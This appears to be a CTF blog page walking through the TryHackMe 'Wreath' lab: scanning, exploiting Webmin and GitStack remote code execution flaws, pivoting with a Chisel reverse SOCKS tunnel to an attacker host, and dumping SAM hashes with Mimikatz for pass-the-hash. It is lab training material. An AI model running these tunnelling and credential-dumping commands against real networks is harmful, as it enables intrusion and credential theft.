---
layout: page
title: TryHackMe Walkthroughs
subtitle: Guided rooms and cybersecurity pathways
permalink: /ctf/platforms/tryhackme/
---

## TryHackMe Walkthroughs

Structured writeups for learning paths and complex rooms on TryHackMe, focused on step-by-step methodologies and conceptual learning.

### Room 1: Wreath (Hard) - Network Pivoting & Evasion

**Objective**: Exploit a 3-host network starting from an external web server, pivoting through an internal Windows machine, and compromising the internal Domain Controller.

#### Step 1: Initial Access (Wreath Web Server)
We perform a network scan on the target public IP:

```bash
nmap -sV -sC -p- -T4 -oN external.nmap 10.200.x.x
```

We discover a running service: MiniServ 1.890 (Webmin) which is vulnerable to unauthenticated remote code execution (CVE-2019-15107).
We configure the exploit and run it to get a root shell:

```python
# CVE-2019-15107 POC execution
import requests
# Payload injection in password change parameter
```

#### Step 2: Pivoting to Host 2 (Windows Production Server)
Once inside the Webmin container, we notice an internal subnet `10.200.x.0/24`. We upload a static `nmap` binary and find a Windows Server on `10.200.x.150` with port 3389 (RDP) and 80 (HTTP) open.

We set up pivoting using **Chisel**:
*   On attacker machine: `chisel server -p 8000 --reverse`
*   On compromised Webmin server: `./chisel client attacker_ip:8000 R:1080:socks`

Now we proxy our tools through proxychains configured for SOCKS5 on port 1080.
Scanning port 80 on the Windows machine reveals GitStack. GitStack 2.3.10 is vulnerable to unauthenticated remote code execution via parameter injection in `git-user` page.

We execute the exploit through proxychains:

```bash
proxychains python3 gitstack_rce.py -t 10.200.x.150 -c "whoami"
```
We get NT AUTHORITY\SYSTEM.

#### Step 3: Extracting Credentials & Pivoting to Domain Controller
We dump local SAM hashes using Mimikatz:

```text
mimikatz # lsadump::sam
```

We find the password hash of the local administrator. We use this to connect to the internal Domain Controller `10.200.x.200` via WinRM or SMB using Pass-the-Hash.

We establish the second pivot using Chisel on the second host, routing traffic deeper into the target environment. This multi-hop pivot setup demonstrates the complexity of pivoting inside modern enterprise corporate networks.
